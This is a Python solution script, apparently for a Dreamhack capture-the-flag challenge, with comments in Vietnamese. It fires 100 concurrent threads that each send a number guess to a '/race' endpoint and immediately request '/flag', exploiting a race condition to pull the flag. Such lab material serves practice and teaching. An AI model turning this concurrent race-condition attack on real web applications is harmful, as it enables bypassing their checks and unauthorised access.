import requests
import threading
import sys

BASE_URL = "http://host8.dreamhack.games:18433/" 

# Biến để báo hiệu khi đã tìm thấy flag
flag_found = threading.Event()

def attack(number):
    """
    Hàm này gửi request tới /race và ngay sau đó là /flag.
    Nó sẽ được chạy trong một luồng riêng.
    """
    # Nếu đã tìm thấy flag ở luồng khác, không cần chạy nữa
    if flag_found.is_set():
        return

    session = requests.Session()
    
    # Gửi request để đoán số
    try:
        # Đặt timeout ngắn để không phải chờ request đoán sai
        race_url = f"{BASE_URL}/race?user={number}"
        session.get(race_url, timeout=0.5) 
    except requests.exceptions.ReadTimeout:
        pass
    except requests.RequestException as e:
        pass

    # Ngay lập tức gửi request để lấy flag
    try:
        flag_url = f"{BASE_URL}/flag"
        response_flag = session.get(flag_url, timeout=1)
        
        # Kiểm tra xem có nhận được flag không
        if "4TH3N3" in response_flag.text and "NOPE" not in response_flag.text:
            print(f"\n[+] SUCCESS! Flag found with guess {number}:")
            print(f"    {response_flag.text}")
            flag_found.set() # Báo hiệu cho các luồng khác dừng lại
    except requests.RequestException:
        pass


if __name__ == '__main__':
    threads = []
    
    print("[*] Starting the attack... Sending 100 requests concurrently.")

    # Tạo và bắt đầu 100 luồng, mỗi luồng cho một số từ 1 đến 100
    for i in range(1, 101):
        thread = threading.Thread(target=attack, args=(i,))
        threads.append(thread)
        thread.start()
        # In tiến trình ra màn hình
        sys.stdout.write(f"\r[*] Threads launched: {i}/100")
        sys.stdout.flush()

    # Chờ tất cả các luồng hoàn thành
    for thread in threads:
        thread.join()

    if not flag_found.is_set():
        print("\n[-] Attack failed. Try running the script again.")